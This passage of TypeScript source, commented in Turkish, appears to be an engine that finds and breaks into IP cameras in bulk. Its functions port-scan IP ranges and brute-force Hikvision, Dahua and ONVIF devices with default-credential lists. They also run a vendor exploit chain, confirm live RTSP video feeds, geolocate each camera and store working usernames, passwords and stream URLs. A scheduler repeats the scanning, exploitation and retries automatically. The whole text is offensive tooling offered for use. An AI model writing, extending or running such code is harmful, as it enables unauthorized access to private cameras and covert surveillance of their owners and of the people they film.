  registry.save();
  return live;
}

async function httpCveScan(store: CameraStore, registry: CameraRegistry, ips: string[]): Promise<number> {
  const open80 = await scanPort(ips, 80, 1500, 1000);
  const set80 = new Set(open80);
  const open8080 = await scanPort(ips.filter((ip) => !set80.has(ip)), 8080, 1500, 1000);
  const hosts = [...new Set([...open80, ...open8080])];
  let live = 0;
  let idx = 0;
  const workers = Array.from({ length: Math.min(20, Math.max(hosts.length, 1)) }, async () => {
    while (idx < hosts.length) {
      const ip = hosts[idx++];

      // ONVIF — satıcı-bağımsız: GetStreamUri ile doğrudan RTSP adresi.
      const onvifPath = await onvifProbe(ip, 80, 3000);
      if (onvifPath) {
        let got = false;
        for (const [u, p] of MASS_CREDS.slice(0, 8)) {
          const streams = await onvifStreams(ip, 80, u, p, 5000);
          for (const s of streams.slice(0, 4)) {
            if (!(await verifyStream(s.url, 12000))) continue;
            const geo = await geoLocator.resolve(ip);
            const id = hashId(s.url);
            const dev: DeviceRecord = {
              id, ip, port: 554, vendor: 'generic', model: '', city: geo?.il || '', district: geo?.ilce || '',
              lat: geo?.lat || 0, lon: geo?.lon || 0, status: 'LIVE', protocol: 'rtsp', url: s.url,
              username: u, password: p, source: 'scan', firstSeen: Date.now(), lastSeen: Date.now(), lastExploit: Date.now(),
            };
            store.upsertDevice(dev);
            store.recordCredSuccess('generic', u, p);
            if (!registry.get(id)) registry.add(toRegistered(dev));
            live++;
            got = true;
          }
          if (got) break; // doğru cred bulundu
        }
      }

      const banner = await grabBanner(ip, 80);
      let vendor = fingerprint(banner.server, banner.title);
      if (vendor === 'generic') continue;
      vendor = await confirmVendor(ip, 80, vendor);
      if (vendor !== 'hikvision' && vendor !== 'dahua') continue;

      const results = await runExploitChain(vendor, ip, 80);
      for (const r of results) {
        if (!r.ok || !r.creds.length) continue;
        for (const [u, p] of r.creds.slice(0, 3)) {
          const url = `rtsp://${encodeURIComponent(u)}:${encodeURIComponent(p)}@${ip}:554/Streaming/Channels/101`;
          if (await verifyStream(url, 12000)) {
            const geo = await geoLocator.resolve(ip);
            const id = hashId(url);
            const device: DeviceRecord = {
              id,
              ip,
              port: 554,
              vendor: vendor as DeviceVendor,
              model: '',
              city: geo?.il || '',
              district: geo?.ilce || '',
              lat: geo?.lat || 0,
              lon: geo?.lon || 0,
              status: 'LIVE',
              protocol: 'rtsp',
              url,
              username: u,
              password: p,
              source: 'scan',
              firstSeen: Date.now(),
              lastSeen: Date.now(),
              lastExploit: Date.now(),
            };
            store.upsertDevice(device);
            store.recordCredSuccess(vendor as DeviceVendor, u, p);
            if (!registry.get(id)) registry.add(toRegistered(device));
            live++;
            break;
          }
        }
      }
    }
  });
  await Promise.all(workers);
  registry.save();
  return live;
}

// 37777 (Dahua private) + 8000 (Hikvision SDK) taraması.
// Bu portlar 554/80 açmayan ama private protokolle erişilen cihazları yakalar.
async function proprietaryScan(store: CameraStore, registry: CameraRegistry, ips: string[]): Promise<number> {
  const open37777 = await scanPort(ips, 37777, 1500, 1000);
  const set37777 = new Set(open37777);
  const open8000 = await scanPort(ips.filter((ip) => !set37777.has(ip)), 8000, 1500, 1000);

  const targets: { ip: string; vendor: 'dahua' | 'hikvision' }[] = [
    ...open37777.map((ip) => ({ ip, vendor: 'dahua' as const })),
    ...open8000.map((ip) => ({ ip, vendor: 'hikvision' as const })),
  ];
  if (!targets.length) return 0;

  let live = 0;
  let idx = 0;
  const workers = Array.from({ length: Math.min(15, Math.max(targets.length, 1)) }, async () => {
    while (idx < targets.length) {
      const { ip, vendor } = targets[idx++];
      const creds: [string, string][] = store.preferredCreds(vendor).length
        ? [...store.preferredCreds(vendor), ...MASS_CREDS].slice(0, 40)
        : (MASS_CREDS.slice(0, 40) as [string, string][]);
      const login = await tryProprietaryAuth(ip, vendor, creds);
      store.logAccess(hashId(`${vendor}:${ip}`), `proprietary-${vendor}`, `${login.user}:${login.pass}`, login.ok);
      if (!login.ok) continue;

      store.recordCredSuccess(vendor, login.user, login.pass);
      const geo = await geoLocator.resolve(ip);
      const path = vendor === 'dahua' ? dahuaRtspPath(1) : hikRtspPath(1);
      const url = `rtsp://${encodeURIComponent(login.user)}:${encodeURIComponent(login.pass)}@${ip}:554${path}`;
      const plays = await verifyStream(url, 15000);
      if (!plays) continue;

      const id = hashId(url);
      const device: DeviceRecord = {
        id,
        ip,
        port: 554,
        vendor,
        model: '',
        city: geo?.il || '',
        district: geo?.ilce || '',
        lat: geo?.lat || 0,
        lon: geo?.lon || 0,
        status: 'LIVE',
        protocol: 'rtsp',
        url,
        username: login.user,
        password: login.pass,
        source: 'scan',
        firstSeen: Date.now(),
        lastSeen: Date.now(),
        lastExploit: Date.now(),
      };
      store.upsertDevice(device);
      if (registry.get(id)) registry.update(id, { url, status: 'online' });
      else registry.add(toRegistered(device));
      live++;
    }
  });
  await Promise.all(workers);
  registry.save();
  return live;
}

async function ensureGeo(d: DeviceRecord): Promise<DeviceRecord> {
  if (d.lat !== 0 || d.lon !== 0) return d;
  const geo = await geoLocator.resolve(d.ip);
  if (!geo) return d;
  return { ...d, city: geo.il, district: geo.ilce, lat: geo.lat, lon: geo.lon };
}

export async function runGeoBackfill(store: CameraStore): Promise<number> {
  const missing = store.listDevices().filter((d) => d.lat === 0 && d.lon === 0);
  let n = 0;
  for (const d of missing) {
    const gd = await ensureGeo(d);
    if (gd.lat !== 0 || gd.lon !== 0) {
      store.upsertDevice(gd);
      n++;
    }
  }
  return n;
}

export async function runCleanup(store: CameraStore): Promise<number> {
  const web = new Set([80, 8080, 8000]);
  const targets = store
    .listDevices()
    .filter((d) => web.has(d.port) && d.vendor === 'generic' && d.protocol !== 'rtsp');
  for (const d of targets) store.removeDevice(d.id);
  // YABANCI TEMİZLİĞİ: TR-only tarıyoruz ama eski kayıtlarda 91.184.0.0/13 gibi
  // bloklardan Belçika/Rusya/İran cihazları kalmış. Kalıcı olarak DB'den düş.
  const foreign = store.listDevices().filter((d) => !geoAllowed(d.lat, d.lon));
  for (const d of foreign) store.removeDevice(d.id);
  return targets.length + foreign.length;
}

function webPort(d: DeviceRecord): number {
  return [80, 8080, 8000, 443].includes(d.port) ? d.port : 80;
}

function dedupe(
  preferred: Array<[string, string]>,
  base: Array<[string, string]>,
): Array<[string, string]> {
  const seen = new Set<string>();
  const out: Array<[string, string]> = [];
  for (const c of [...preferred, ...base]) {
    const k = `${c[0]}\u0000${c[1]}`;
    if (seen.has(k)) continue;
    seen.add(k);
    out.push(c);
  }
  return out;
}

export async function runVendorAuthExploit(store: CameraStore, registry: CameraRegistry): Promise<number> {
  const targets = store
    .listDevices()
    .filter(
      (d) =>
        (d.status === 'DISCOVERED' || d.status === 'DEAD' || d.status === 'INACCESSIBLE') &&
        (d.vendor === 'hikvision' || d.vendor === 'dahua') &&
        [80, 8080, 8000, 443].includes(d.port),
    );
  let live = 0;

  for (const d of targets) {
    const gd = await ensureGeo(d);
    if (gd.lat !== d.lat || gd.lon !== d.lon) store.upsertDevice(gd);
    const creds = dedupe(store.preferredCreds(d.vendor), DEFAULT_CREDS);
    const wp = webPort(d);
    let ok = false;

    for (const [u, p] of creds) {
      const login =
        d.vendor === 'hikvision'
          ? await hikvisionLogin(d.ip, wp, u, p)
          : await dahuaLogin(d.ip, wp, u, p);
      store.logAccess(d.id, 'vendor-auth', `${u}:${p}`, login.ok);
      if (!login.ok) continue;

      store.recordCredSuccess(d.vendor, u, p);
      const channels =
        d.vendor === 'hikvision'
          ? await hikvisionChannelCount(d.ip, wp, u, p)
          : await dahuaChannelCount(d.ip, wp, u, p);
      const maxCh = channels > 0 ? channels : 4;
      const streams = await discoverStreams(d.ip, 554, u, p, d.vendor, maxCh);

      if (streams.length) {
        for (const url of streams) {
          const id = hashId(url);
          const ch: DeviceRecord = {
            ...gd,
            id,
            port: 554,
            url,
            protocol: 'rtsp',
            status: 'LIVE',
            username: u,
            password: p,
            lastSeen: Date.now(),
            lastExploit: Date.now(),
          };
          store.upsertDevice(ch);
          if (!registry.get(id)) registry.add(toRegistered(ch));
        }
        live += streams.length;
      } else {
        const acc: DeviceRecord = {
          ...gd,
          username: u,
          password: p,
          status: 'ACCESSIBLE',
          lastSeen: Date.now(),
          lastExploit: Date.now(),
        };
        store.upsertDevice(acc);
        if (registry.get(d.id)) registry.update(d.id, { status: 'online', lastSeen: Date.now() });
        else registry.add(toRegistered(acc));
        live += 1;
      }
      ok = true;
      break;
    }

    if (!ok) store.upsertDevice({ ...gd, status: 'INACCESSIBLE', lastSeen: Date.now() });
  }

  registry.save();
  return live;
}

export async function runPublicScrape(registry: CameraRegistry): Promise<number> {
  const cams = await scrapePublic();
  // F: UPnP IGD ile dışa açılmış kameralar (modem port yönlendirmesi).
  try {
    for (const url of await upnpCameraUrls()) {
      const id = hashId(url);
      if (registry.get(id)) continue;
      cams.push({
        id,
        name: `UPnP ${url.replace(/^https?:\/\//, '').slice(0, 40)}`,
        il: 'yerel',
        ilce: 'upnp',
        lat: 0,
        lon: 0,
        protocol: url.startsWith('rtsp') ? 'rtsp' : 'http',
        url,
        status: 'unknown',
        source: 'intrusion',
        lastSeen: Date.now(),
        latencyMs: null,
      });
    }
  } catch {
    /* UPnP yok → sorun değil */
  }
  let added = 0;
  for (const c of cams) {
    if (!registry.get(c.id)) {
      registry.add(c);
      added++;
    }
  }
  // DOĞRULAMA: HTML'den çıkan URL'i "online" saymak yanlıştı. Gerçekten yayın
  // verenleri (HLS/MJPEG/HTTP) canlı test et, geçenleri online'a yükselt.
  try {
    const pend = registry.all().filter((c) => c.source === 'import' && !c.verified && c.protocol !== 'rtsp');
    if (pend.length) {
      const valid = await validateBatch(pend.map((c) => ({ id: c.id, url: c.url, protocol: c.protocol })), 6);
      for (const v of valid) registry.update(v.id, { verified: true, status: 'online' });
      console.log(`[PublicScrape] ${valid.length}/${pend.length} kaynak gerçekten yayın veriyor`);
    }
  } catch {
    /* doğrulama düştü → kayıtlar unknown kalır */
  }
  registry.save();
  return added;
}

export function registerEngineTasks(
  scheduler: Scheduler,
  store: CameraStore,
  registry: CameraRegistry,
  engine: StreamEngine,
): void {
  scheduler.register('mass-scan', async () => { await runMassScan(store, registry); }, 15_000, true);
  // Arayüzün ANINDA dolması için: bilinen cihazları store'dan registry'ye taşı.
  scheduler.register('registry-backfill', async () => { await runRegistryBackfill(store, registry); }, 60_000, true);
  // IOT GİRİŞ KANALI: telnet/backdoor → config'ten GERÇEK şifre → RTSP doğrula.
  scheduler.register('iot-scan', async () => { await runIotScan(store, registry); }, 10 * 60_000, true);
  scheduler.register('exploit-pass', async () => { await runExploitPass(store, registry); }, 5 * 60_000, true);
  scheduler.register('thumbnail-gen', async () => { await runThumbnails(store); }, 5 * 60_000, false);
  scheduler.register('health-check', async () => { await runHealthCheck(store, registry, engine); }, 60_000, false);
  scheduler.register('dead-retry', async () => { await runExploitPass(store, registry); }, 24 * 60 * 60_000, false);
  scheduler.register('public-scrape', async () => { await runPublicScrape(registry); }, 6 * 60 * 60_000, true);
  scheduler.register('geo-backfill', async () => { await runGeoBackfill(store); }, 30 * 60_000, true);
  scheduler.register('cloud-scan', async () => { await runCloudScan(registry); }, 20 * 60_000, true);
  scheduler.register('cleanup', async () => { await runCleanup(store); }, 60 * 60_000, true);
}

